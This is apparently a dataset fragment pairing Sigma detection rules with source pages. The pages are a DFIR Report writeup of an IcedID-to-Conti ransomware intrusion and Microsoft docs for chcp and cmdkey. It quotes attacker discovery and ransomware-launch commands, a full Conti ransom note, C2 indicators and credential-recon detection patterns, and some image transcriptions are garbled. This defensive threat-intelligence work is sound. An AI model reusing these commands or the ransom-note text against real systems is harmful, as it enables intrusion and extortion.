-nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n  | ProcessCreated | regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\<redacted>\\C$\" x64.dll |                                 |            |\n```\n\nThis x64.dll DLL contains fingerprints, “conti_v3.dll”, seen in our previous cases:\n\n```image\nAlt: Conti DLL\nDescription: The image displays a snippet of disassembled code related to the Conti ransomware, specifically showing the export ordinals table for the 'conti_v3.dll'. It includes variable declarations such as 'aConti_v3_dll', 'aDllInstall', and 'aDllRegisterServer', indicating functions or data that are exported by the DLL. This technical representation serves to provide insight into the internal workings of the malware, relevant for cybersecurity analysis.\nTranscription: |\n  ; Export Ordinals Table for conti_v3.dll\n  ;\n  .rdata:00000001800323C0\n  word_1800323C0 dw 1, 0, 2\n  .rdata:00000001800323C6\n  aConti_v3_dll db 'conti_v3.dll',0\n  aDllInstall db 'DllInstall',0\n  aDllRegisterServer db 'DllRegisterServer',0\n```\n\nWe didn’t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.\n\nOnce the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.\n\n```image\nAlt: SMB Activity\nDescription: The image displays a line graph illustrating SMB network activity over a specific time frame. The x-axis represents the dates in December, while the y-axis indicates the volume of SMB activity. A significant spike is observed on December 19, suggesting a surge in network activity during the ransomware deployment, consistent with the details provided in the accompanying text regarding the execution of the ransomware payload.\nTranscription: |\n  | Date   | SMB Activity |\n  | ------ | ------------ |\n  | Mon 13 | 0            |\n  | Wed 15 | 0            |\n  | Fri 17 | 0            |\n  | Sat 19 | 0            |\n  | Tue 21 | 0            |\n  | Thu 23 | 0            |\n  | Sat 25 | 0            |\n  | Mon 27 | 0            |\n  | Wed 29 | 0            |\n  | Fri 31 | 0            |\n  | 2022   | 243          |\n```\n\nThis resulted in files being encrypted and a ‘readme.txt’ ransom note generated on the hosts:\n\n```image\nAlt: Ransom Note\nDescription: The image displays a list of file paths from a system, specifically focusing on instances of 'readme.txt'. The paths indicate that the files are located within various directories under 'AppData\\Local\\Microsoft\\OneDrive\\'. The repetition of 'readme.txt' suggests that this file may be generated by ransomware, such as Conti, as part of its encryption process, hinting at the locations where ransom notes might be found on infected systems.\nTranscription: |\n  AppData\\Local\\Microsoft\\OneDrive\\setup\\logs\\readme.txt           1,183\n  AppData\\Local\\Microsoft\\OneDrive\\setup\\logs\\readme.txt           1,183\n  AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\readme.txt    1,183\n  AppData\\Local\\Microsoft\\OneDrive\\settings\\Personal\\readme.txt    1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\readme.txt        1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\readme.txt          1,183\n  AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\readme.txt          1,183\n```\n\nThe ransom note has slightly been modified from our last Conti cases:\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed in a Notepad window, indicating that all files on the victim's system are encrypted by the CONTI ransomware strain. The note contains instructions for the victim, including a warning against using recovery software, a suggestion to contact the attackers for further instructions, and a link to a TOR website. Additionally, it mentions that the attackers will decrypt two random files for free as a demonstration of their service. The note includes sections for an identification ID and emphasizes the consequences of ignoring the ransom demand.\nTranscription: |\n  All of your files are currently encrypted by CONTI strain.\n  \n  As you know (if you don't - just \"google it\"), all of the data that has been encrypted by our software cannot be recovered by any means without contacting our team directly.\n  If you try to use any additional recovery software - the files might be damaged, so if you are willing to try - try it on the data of the lowest value.\n  \n  To make sure that we REALLY CAN get your data back - we offer you to decrypt 2 random files completely free of charge.\n  \n  You can contact our team directly for further instructions through our website:\n  \n  TOR VERSION:\n  (you should download and install TOR browser first https://torproject.org)\n  \n  http://conti[REDACTED]cziBa8Qr4\n  \n  YOU SHOULD BE AWARE!\n  Just in case, if you try to ignore us. We've downloaded a pack of your internal data and are ready to publish it on out news website if you do not respond. So it will be better for both sides if you contact us as soon as possible.\n  \n  ---BEGIN ID---\n  [REDACTED]\n  ---END ID---\n```\n\n## Indicators\n\n### Network\n\n```\nEmail Addresses used for Atera Registration:\nmarsmors1947@gmail.com\nhughess6623@outlook.com\n\n5.181.80.214:80\nguguchrome.com\n\n5.181.80.113:443\napplesflying.com\n\n103.208.86.7:80\nbunced.net\n\n172.241.29.192:443\nwayeyoy.com\n\n23.81.246.30:443\ncirite.com\n\n216.73.159.33:80\nshytur.com\n```\n\n### File\n\n```\ndata.dll\n71c8eb081c33fd6b2c10effa92154a18\n8222ed4fcac2c7408e7fbb748af1752e72bb9b01\nbaeb13eea3a71cfaba9d20ef373dcea69cf31f2ec21f45b83f29f699330cb3e3\n\nFaicuy4.exe\nfe4fb0b3ca2cb379d74cd239e71af44f\n6ccd04b109a5148a04ae3ac7f6bc061ccab2122f\na79f5ce304707a268b335f63d15e2d7d740b4d09b6e7d095d7d08235360e739c\n\nEwge.dll/Ijucko32.dll\nb3053228b51ae7af99e0abfa663368d5\n670d974d936262c1c569442238d953ed009f7c79\n4d62929aa9e76694a62b46bc05425452f26e1e9b09ea6f294850ace825229966\n\nEdebef4.dll\n7375eccff18bef7e89665d1a7f31edca\na0836d54aa2a783fd8bae685a1b94e913b655430\n50d2a2564541887570cf784c677de6900aa503648c510927e08c32b5a6ae3bf5\n\nx64.dll\n28bd01b6b3efa726bf00d633398c5c8a\n11012f0074e37e105c404a2eda61f9d652b8c03d\n8fb035b73bf207243c9b29d96e435ce11eb9810a0f4fdcc6bb25a14a0ec8\n```\n\n## Detections\n\n### Suricata\n\n```\nET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\nET MALWARE Cobalt Strike Beacon Activity (GET)\nETPRO POLICY Observed Atera Remote Access Application Activity Domain in TLS SNI\nET POLICY Command Shell Activity Over SMB - Possible Lateral Movement\nET POLICY SMB Executable File Transfer\nET POLICY SMB2 NT Create AndX Request For an Executable File\nET HUNTING Possible Powershell .ps1 Script Use Over SMB\nET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File\n```\n\n### Sigma\n\n- LSASS Memory Dump\n- PowerView Malicious Commandlets\n- AdFind Discovery\n- Disable Defender\n- Admin Share Access\n- Atera RMM Agent Install\n- Trust Discovery\n- Recon Activity\n- Cobalt Strike Service Installs\n\n```\ntitle: CHCP CodePage Locale Lookup\nstatus: Experimental\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nauthor: _pete_0, TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\ndate: 2022/02/21\nmodified: 2022/02/21\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n      - '\\chcp.com'\n    CommandLine|endswith:\n      - 'chcp'\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    ParentCommandLine|contains:\n      - '/c'\n  condition: selection\nfields:\n  - CommandLine\n  - ParentCommandLine\nfalsepositives:\n  - Unknown\nlevel: high\ntags:\n  - attack.discovery\n  - attack.t1614.001\n```\n\n## YARA\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-04-04\n   Identifier: 9438 conti\n   Reference: https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nrule cs_exe_9438 {\n   meta:\n      description = \"9438 - file Faicuy4.exe\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\"\n      date = \"2022-04-04\"\n      hash1 = \"a79f5ce304707a268b335f63d15e2d7d740b4d09b6e7d095d7d08235360e739c\"\n   strings:\n      $x1 = \"C:\\\\Users\\\\Administrator\\\\Documents\\\\Visual Studio 2008\\\\Projects\\\\MUTEXES\\\\x64\\\\Release\\\\MUTEXES.pdb\" fullword ascii\n      $s2 = \"mutexes Version 1.0\" fullword wide\n      $s3 = \"        <requestedExecutionLevel level=\\\"asInvoker\\\" uiAccess=\\\"false\\\"/><requestedExecutionLevel>\" fullword ascii\n      $s4 = \".?AVCMutexesApp@@\" fullword ascii\n      $s5 = \".?AVCMutexesDlg@@\" fullword ascii\n      $s6 = \"About mutexes\" fullword wide\n      $s7 = \"Mutexes Sample\" fullword wide\n      $s8 = \" 1992 - 2001 Microsoft Corporation.  All rights reserved.\" fullword wide\n      $s9 = \"&Process priority class:\" fullword wide\n      $s10 = \" Type Descriptor'\" fullword ascii\n      $s11 = \"&About mutexes...\" fullword wide\n      $s12 = \" constructor or from DllMain.\" fullword ascii\n      $s13 = \".?AVCDisplayThread@@\" fullword ascii\n      $s14 = \"IsQ:\\\"P\" fullword ascii\n      $s15 = \"CExampleThread\" fullword ascii\n      $s16 = \".?AVCCounterThread@@\" fullword ascii\n      $s17 = \".?AVCExampleThread@@\" fullword ascii\n      $s18 = \"  <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii\n      $s19 = \"CDisplayThread\" fullword ascii\n      $s20 = \"CCounterThread\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      1 of ($x*) and 4 of them\n}\n\nrule conti_dll_9438 {\n   meta:\n      description = \"9438 - file x64.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\"\n      date = \"2022-04-04\"\n      hash1 = \"8fb035b73bf207243c9b29d96e435ce11eb9810a0f4fdcc6bb25a14a0ec8cc21\"\n   strings:\n      $s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n      $s2 = \"conti_v3.dll\" fullword ascii\n      $s3 = \"        <requestedExecutionLevel level='asInvoker' uiAccess='false' />\" fullword ascii\n      $s4 = \"api-ms-win-core-processthreads-l1-1-2\" fullword wide\n      $s5 = \"ext-ms-win-ntuser-dialogbox-l1-1-0\" fullword wide\n      $s6 = \" Type Descriptor'\" fullword ascii\n      $s7 = \"operator \\\"\\\" \" fullword ascii\n      $s8 = \"operator co_await\" fullword ascii\n      $s9 = \"  <trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\\\">\" fullword ascii\n      $s10 = \"api-ms-win-rtcore-ntuser-window-l1-1-0\" fullword wide\n      $s11 = \"api-ms-win-security-systemfunctions-l1-1-0\" fullword wide\n      $s12 = \"ext-ms-win-ntuser-windowstation-l1-1-0\" fullword wide\n      $s13 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n      $s14 = \" Base Class Descriptor at (\" fullword ascii\n      $s15 = \" Class Hierarchy Descriptor'\" fullword ascii\n      $s16 = \"bad array new length\" fullword ascii\n      $s17 = \" Complete Object Locator'\" fullword ascii\n      $s18 = \".data$r\" fullword ascii\n      $s19 = \" delete[]\" fullword ascii\n      $s20 = \"  </trustInfo>\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 700KB and\n      all of them\n}\n```\n\n### MITRE\n\n```\nT1614.001 - System Location Discovery: System Language Discovery\nT1218.010 - Signed Binary Proxy Execution: Regsvr32\nT1218.011 - Signed Binary Proxy Execution: Rundll32\nT1059.001 - Command and Scripting Interpreter: PowerShell\nT1055 - Process Injection\nT1003.001 - OS Credential Dumping: LSASS Memory\nT1486 - Data Encrypted for Impact\nT1482 - Domain Trust Discovery\nT1021.002 - Remote Services: SMB/Windows Admin Shares\nT1219 - Remote Access Software\nT1083 - File and Directory Discovery\nT1562.001 - Impair Defenses: Disable or Modify Tools\nT1518.001 - Software Discovery: Security Software Discovery\nT1047 - Windows Management Instrumentation\nT1087.002 - Account Discovery: Domain Account\nT1068 - Exploitation for Privilege Escalation\nT1082 - System Information Discovery\nT1018 - Remote System Discovery\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1569.002 - Service Execution\nT1071.001 Web Protocols\n\nS0552 - AdFind\nS0154 - Cobalt Strike\nS0097 - Ping\n```",
    "sigma_rule": {
      "title": "Console CodePage Lookup Via CHCP",
      "id": "7090adee-82e2-4269-bd59-80691e7c6338",
      "status": "test",
      "description": "Detects use of chcp to look up the system locale value as part of host discovery",
      "references": [
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-02-21",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1614.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|contains|windash": [
            " -c ",
            " -r ",
            " -k "
          ],
          "Image|endswith": "\\chcp.com",
          "CommandLine|endswith": [
            "chcp",
            "chcp ",
            "chcp  "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.",
        "Discord was seen using chcp to look up code pages"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_chcp_codepage_lookup.yml",
    "id": "99"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp",
    "markdown": "# chcp\n\nChanges the active console code page. If used without parameters, **chcp** displays the number of the active console code page.\n\n## Syntax\n\n```\nchcp [<nnn>]\n```\n\n## Parameters\n\n| Parameter | Description |\n|-----------|-------------|\n| `<nnn>`   | Specifies the code page. |\n| `/?`      | Displays help at the command prompt. |\n\nThe following table lists each supported code page and its country/region or language:\n\n| Code page | Country/region or language |\n|-----------|----------------------------|\n| 437       | United States               |\n| 850       | Multilingual (Latin I)      |\n| 852       | Slavic (Latin II)           |\n| 855       | Cyrillic (Russian)          |\n| 857       | Turkish                    |\n| 860       | Portuguese                 |\n| 861       | Icelandic                  |\n| 863       | Canadian-French            |\n| 865       | Nordic                     |\n| 866       | Russian                    |\n| 869       | Modern Greek               |\n| 936       | Chinese                    |\n\n## Remarks\n\n- Only the original equipment manufacturer (OEM) code page that is installed with Windows appears correctly in a Command Prompt window that uses Raster fonts. Other code pages appear correctly in full-screen mode or in Command Prompt windows that use TrueType fonts.\n- You don't need to prepare code pages (as in MS-DOS).\n- Programs that you start after you assign a new code page use the new code page. However, programs (except Cmd.exe) that you started before assigning the new code page will continue to use the original code page.\n\n## Examples\n\nTo view the active code page setting, type:\n\n```\nchcp\n```\n\nA message similar to the following appears:\n\n```\nActive code page: 437\n```\n\nTo change the active code page to 850 (Multilingual), type:\n\n```\nchcp 850\n```\n\nIf the specified code page is invalid, the following error message appears:\n\n```\nInvalid code page\n```\n\n## Related links\n\n- Command-Line Syntax Key\n- Code Page BitFields\n- Code Page Identifiers",
    "sigma_rule": {
      "title": "Console CodePage Lookup Via CHCP",
      "id": "7090adee-82e2-4269-bd59-80691e7c6338",
      "status": "test",
      "description": "Detects use of chcp to look up the system locale value as part of host discovery",
      "references": [
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-02-21",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1614.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|contains|windash": [
            " -c ",
            " -r ",
            " -k "
          ],
          "Image|endswith": "\\chcp.com",
          "CommandLine|endswith": [
            "chcp",
            "chcp ",
            "chcp  "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.",
        "Discord was seen using chcp to look up code pages"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_chcp_codepage_lookup.yml",
    "id": "100"
  },
  {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
    "markdown": "# Cmdkey\n\n**Applies To**: Windows Vista, Windows Server 2008, Windows Server 2012, Windows 8\n\nCreates, lists, and deletes stored user names and passwords or credentials.\n\nFor examples of how this command can be used, see Examples.\n\n## Syntax\n\n```\ncmdkey [{/add:<TargetName>|/generic:<TargetName>}] {/smartcard|/user:<UserName> [/pass:<Password>]} [/delete{:<TargetName>|/ras}] /list:<TargetName>\n```\n\n## Parameters\n\n| Parameters               | Description                                                                                                                                                                                                 |\n|--------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| `/add:<TargetName>`       | Adds a user name and password to the list. Requires the parameter of `<TargetName>` which identifies the computer or domain name that this entry will be associated with.                                   |\n| `/generic:<TargetName>`   | Adds generic credentials to the list. Requires the parameter of `<TargetName>` which identifies the computer or domain name that this entry will be associated with.                                         |\n| `/smartcard`              | Retrieves the credential from a smart card.                                                                                                                                                                |\n| `/user:<UserName>`        | Specifies the user or account name to store with this entry. If `UserName` is not supplied, it will be requested.                                                                                           |\n| `/pass:<Password>`        | Specifies the password to store with this entry. If `Password` is not supplied, it will be requested.                                                                                                       |\n| `/delete{:<TargetName> | /ras}` | Deletes a user name and password from the list. If `TargetName` is specified, that entry will be deleted. If `/ras` is specified, the stored remote access entry will be deleted.                     |\n| `/list:<TargetName>`      | Displays the list of stored user names and credentials. If `TargetName` is not specified, all stored user names and credentials will be listed.                                                             |\n| `/?`                      | Displays help at the command prompt.                                                                                                                                                                       |\n\n## Remarks\n\n- If more than one smart card is found on the system when the `/smartcard` command-line option is used, **cmdkey** will display information about all available smart cards and then prompt the user to specify which one to use.\n- Passwords will not be displayed once they are stored.\n\n## Examples\n\nTo display a list of all user names and credentials that are stored, type:\n\n```\ncmdkey /list\n```\n\nTo add a user name and password for user Mikedan to access computer Server01 with the password Kleo, type:\n\n```\ncmdkey /add:server01 /user:mikedan /pass:Kleo\n```\n\nTo add a user name and password for user Mikedan to access computer Server01 and prompt for the password whenever Server01 is accessed, type:\n\n```\ncmdkey /add:server01 /user:mikedan\n```\n\nTo delete the credential that remote access has stored, type:\n\n```\ncmdkey /delete /ras\n```\n\nTo delete the credential that is stored for Server01, type:\n\n```\ncmdkey /delete:Server01\n```\n\n## Additional references\n\n- Command-Line Syntax Key)",
    "sigma_rule": {
      "title": "Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE",
      "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53",
      "status": "test",
      "description": "Detects usage of cmdkey to look for cached credentials on the system",
      "references": [
        "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
        "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey"
      ],
      "author": "jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-03-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmdkey.exe"
          },
          {
            "OriginalFileName": "cmdkey.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -l"
        },
        "condition": "all of selection*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "User"
      ],
      "falsepositives": [
        "Legitimate administrative tasks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmdkey_recon.yml",
    "id": "102"
  },
  {
    "url": "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
    "markdown": "# Stolen Images Campaign Ends in Conti Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nconti\nexploit\nicedid\nransomware\n\n**Published on:** April 4, 2022\n\n---\n\nIn this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector. IcedID is a banking trojan that first appeared in 2017, usually delivered via malspam campaigns and has been widely used as an initial access vector in multiple ransomware intrusions.\n\nUpon execution of the IcedID DLL, discovery activity was performed which was followed by the dropping of a Cobalt Strike beacon on the infected host. Along the way, the threat actors installed remote management tools such as Atera and Splashtop for persisting in the environment. While remaining dormant most of the time, the adversary deployed Conti ransomware on the 19th day (shortly after Christmas), resulting in domain-wide encryption.\n\n## Case Summary\n\nWe assess with high confidence that the “Stolen Image Evidence” email campaign was used to deliver the IcedID DLL. This was first reported by Microsoft in April 2021.\n\nUpon execution of the IcedID DLL, a connection to a C2 server was established. This was followed by the creation of a scheduled task on the beachhead host to establish persistence. The task executed the IcedID payload every one hour. The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.\n\nAfter a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host. Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain. Nltest and net group were utilized to look for sensitive groups such as Domain Admins and Enterprise Admins. Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.\n\nThe threat actors proceeded to install remote management tools such as Atera Agent and Splashtop. Use of these 3rd party administrative tools allows the threat actors another “legitimate” means of persistence and access if they were to lose their malware connection. In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration. Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.\n\nOn the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder. On the following day, the seventh day of the intrusion, the threat actors made their next move. On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used. From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.\n\nAfter getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access. From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again. After this, the threat actors went quiet.\n\nOn day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time. On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL. A little discovery check-in was observed on the 14th day, but little else.\n\nOn the 19th day, the threat actors moved towards their final objectives. They reviewed the directory structure of several hosts including domain controllers and backup servers. They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat. However, they found that their execution failed.\n\nThey left for a few hours, and then returned, and attempted to exploit a couple of CVE’s in an attempt to escalate privileges. The threat actors had already secured domain admin access but it’s possible the operator may have thought they lacked permissions when their first ransomware execution failed.\n\nWhile these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers. Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller. This time the execution worked as intended and resulted in domain-wide ransomware.\n\n## Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Stolen Images Campaign Ends in Conti Ransomware\nDescription: The image is a detailed timeline of events related to a cyber attack campaign identified as 'Stolen Images Campaign Ends in Conti Ransomware.' It outlines specific actions taken during various days, labeled from Day 1 to Day 19, with timestamps indicating when each event occurred. The timeline includes entries for IceID execution, command and control activities, process injections, credential access, discovery actions, software installations on beachheads and domain controllers, lateral movements, and finally, the impact of ransomware deployment. Each entry is associated with specific file names and actions taken by the attackers, providing a comprehensive overview of the attack sequence.\nTranscription: |\n  Stolen Images Campaign Ends in Conti Ransomware\n  \n  Day 1\n  23:14 UTC - IcedID Execution\n      R6SVR32.EXE\n  23:14 UTC - IcedID Command and Control\n      g.guogchrome.com\n      5.181.80.214:30\n  23:14 UTC - Persistence\n      Scheduled Task\n  23:15 UTC - Discovery\n      cmd.exe /c chcp 437\n      WMIC Node:localhost /Namespace:\\\\root\\security\\center Path AntiVirusProduct Get /Format:List\n      ipconfig /all\n      systeminfo\n      net config workstation\n      nttest /domain:trusts\n  \n  Day 2\n  01:06 UTC - Cobalt Strike Beacon\n      Facluy.exe\n  01:26 UTC - Process Injection\n      Facluy.exe = explorer.exe\n  01:40 UTC - Credential Access\n      dllhost.exe access to less memory\n  15:53 UTC - Process Injection\n      rundll32.exe = wlogin.exe\n  \n  Day 6\n  19:51 UTC - Discovery\n      C:\\Windows\\system32\\cmd.exe /c nttest /list\n      Invoke: ShareFinder\n  \n  Day 7\n  01:28 UTC - Remote Access Software Install on Beachhead\n      MAgent.exe\n      Sqlahp://https://mamer5346.exe\n  14:58 UTC - Cobalt Strike Command and Control\n      quick32.dll\n      Ewag.dll\n      Edbeef.dll\n      wayjey.com (172.241.219.52)\n  \n  Day 9\n  14:01 UTC - Remote Access Software Install on Domain Controller\n      C:\\Windows\\System32\\msiexec.exe /i C:\\programdata\\agent.msi\n      Agent.exe\n  \n  Day 10\n  New Cobalt Strike Command and Control\n      26.713.59.33:30 (cyhur.com)\n  \n  Day 14\n  19:54 UTC - New Cobalt Strike Beacon & Disable Defender on Beachhead\n      rundll32.exe C:\\programdata\\file.dll\n      BlingBlingServer\n      Downloaded and executed by the Agent.exe\n      powershell -nop -exec bypass -EncodedCommand ...\n  \n  Day 19\n  17:04 UTC - Discovery\n      net group /domain \"Domain Admins\"\n      C:\\Windows\\system32\\cmd.exe /c nttest /list\n  \n  16:25 UTC - Backup Discovery\n      cmd.exe /c \"dir %VSS%\\\" > backup.txt\n  \n  22:11 UTC - Privilege Escalation Attempt (CVE-2021-42278 and CVE-2021-42287)\n      Scanning activity\n      QueryName: SAMTHADMIN%2\n      Image: C:\\Windows\\system32\\dllhost.exe\n  \n  22:31 UTC - Impact: Data Encrypted Ransomware executed via domain controller\n      cmd.exe /c backup.bat\n      regsvr32.exe /s /u /n /e /size 10 -\n      nomute.exe /p VSS/TOC/4.dll\n      connections via SMB to encrypt and deploy ransom note.\n```\n\n## Initial Access\n\nThe IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a “Stolen Image Evidence” email campaign.\n\n> \"Stolen Images\" #ContactForms campaign that submits \"https://t.co/uc4QkLQt4b\" links into contact us forms now dropping an .iso file and #IcedID dll.\n> — Sean (@infosecfu) December 9, 2021\n\nThese initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets.\n\nThe emails contain a link to a legitimate storage service like those offered by Google and Microsoft. In this example, “http://storage.googleapis.com” was used to host a zip file. The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file. Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.\n\nBelow is a configuration extraction of that initial IcedID malware from an automated sandbox analysis of the sample:\n\n```\n{\n  \"Campaign ID\": 870605016,\n  \"C2 url\": \"guguchrome.com\"\n}\n```\n\n## Execution\n\nThe graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:\n\n```image\nAlt: Execution Graph\nDescription: The image is a detailed execution graph illustrating the actions performed during a cyber attack related to the Conti ransomware campaign. It features various nodes showing the sequence of actions, including commands executed (e.g., 'regsvr32.exe'), processes created (e.g., 'Winlogon.exe', 'explorer.exe'), and connections made to different IP addresses and domains. Additionally, it lists various technical details like file paths, network commands, and the overall flow of the attack. The graph visually represents the malicious activities and their relationships, providing valuable insights into the attack methodology.\nTranscription: |\n  Stolen Images Campaign Ends in Conti Ransomware\n  \n  Malicious DLL executed\n  - regsvr32.exe C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\baeb1ee3a7fcaba9d20ef573dcea69fcf31f2ec21f458b2f9f9350cb3e3.dll\n  - regsvr32.exe /s C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Ewge.dll\n  - C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Faicuv4.exe\n  \n  Connect to\n  - 45.142.213.228 : 80\n  - 5.181.80.113 : 443 --> applesflying.com\n  - 91.90.212.52 : 80\n  - 5.181.80.214 : 80 --> gucghrome.com\n  - 192.198.88.110 : 80\n  - 99.84.243.73 : 443\n  - 23.106.223.27 : 443 --> www.rihatin.com\n  \n  Access Process\n  - Winlogon.exe\n  - explorer.exe\n  \n  Create Remote Thread\n  - regsvr32.exe\n  - svchost.exe\n  \n  Load\n  - C:\\Users\\%REDACTED%\\AppData\\Local\\Temp\\Edebef4.dll\n  \n  Ransomware execution\n  - regsvr32.exe /s /n /i:\"m\" -net -size 10 -nometex -p 1\\%REDACTED%\\CS* x64.dll\n  \n  Drop file\n  - C:\\Windows\\System32\\spool\\x64.dll\n  - C:\\Windows\\System32\\downlevel\\x64.dll\n  - C:\\Windows\\System32\\spool\\backup.bat\n```\n\n## Persistence\n\n### Scheduled Tasks\n\nOnly one scheduled task was created during this intrusion. The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:\n\n```\n<Exec>\n    <Command>rundll32.exe</Command>\n    <Arguments>\"C:\\Users\\REDACTED\\AppData\\Local\\{C904416E-A880-3136-ED72-AA63AF7DB1F2}\\Gaagsp2.dll\",DllMain 